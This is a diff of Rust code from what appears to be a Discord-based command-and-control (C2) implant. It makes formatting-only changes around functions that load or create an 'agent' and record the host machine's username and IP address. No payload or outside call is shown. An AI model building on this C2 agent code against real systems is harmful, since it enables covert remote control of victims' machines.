@@ -14,8 +14,8 @@ use std::{
     path::Path,
 };
 
-use serenity::{client::Context, model::id::ChannelId};
 use serde::{Deserialize, Serialize};
+use serenity::{client::Context, model::id::ChannelId};
 use tracing::error;
 
 #[derive(Serialize, Deserialize)]
@@ -169,8 +169,7 @@ fn get_config() -> Result<File, DiscordC2Error> {
 
 // Public helper method to either load the agent or create a new one assuming it doesn't exist (or there was an error)
 pub async fn get_or_create_agent(ctx: &Context) -> Agent {
-
-    async fn create_agent(ctx: &Context) -> Agent{
+    async fn create_agent(ctx: &Context) -> Agent {
         // Find the hostname/IP of our agent
         let (hostname, ip) = (user(), ip().await.unwrap());
 
@@ -194,9 +193,7 @@ pub async fn get_or_create_agent(ctx: &Context) -> Agent {
 
     match Agent::load() {
         Ok(Some(agent)) => agent,
-        Ok(None) => {
-            create_agent(ctx).await
-        }
+        Ok(None) => create_agent(ctx).await,
         Err(why) => {
             error!("Error loading agent, so one was created: {}", why);
             create_agent(ctx).await
